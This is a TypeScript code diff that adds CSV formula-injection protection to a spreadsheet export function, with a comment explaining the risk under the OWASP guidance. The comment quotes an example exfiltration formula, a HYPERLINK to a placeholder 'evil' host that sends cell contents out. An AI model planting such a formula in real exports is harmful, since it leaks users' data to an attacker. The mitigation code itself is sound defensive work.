@@ -20,11 +20,35 @@ function csvField(value: string): string {
   return value;
 }
 
+// Security audit (commercial completion pass) — CSV/formula injection.
+// Excel, Sheets, and LibreOffice all treat a cell whose text begins with
+// =, +, -, @, a tab, or a CR as a formula to EVALUATE, not display —
+// e.g. a customer/staff/supplier name of `=HYPERLINK("http://evil/?"&A1)`
+// would silently turn into a clickable exfiltration link (or worse, a DDE
+// payload on older Excel) the moment an owner opens an exported CSV in a
+// spreadsheet app. Free-text fields across every export route
+// (fullName/name/address/note/email) are exactly this: end-user-supplied
+// strings (a customer's own name at signup, a staff member's account
+// name, a supplier a manager typed in), not values this codebase
+// controls. Neutralized by prefixing a single quote, the standard
+// mitigation (OWASP "CSV Injection") — spreadsheet apps then render the
+// text literally instead of evaluating it.
+//
+// Deliberately scoped to values whose ORIGINAL type was a string (not
+// number/boolean) — a legitimate negative money amount like -500 must
+// keep displaying as -500, not '−500; only free text can carry an
+// attacker-authored formula.
+const FORMULA_TRIGGER_PATTERN = /^[=+\-@\t\r]/;
+
+function neutralizeFormulaInjection(text: string): string {
+  return FORMULA_TRIGGER_PATTERN.test(text) ? `'${text}` : text;
+}
+
 function stringifyCell(value: unknown): string {
   if (value === null || value === undefined) return "";
   if (typeof value === "number") return Number.isFinite(value) ? String(value) : "";
   if (typeof value === "boolean") return value ? "true" : "false";
-  return String(value);
+  return neutralizeFormulaInjection(String(value));
 }
 
 export type CsvColumn<T> = {
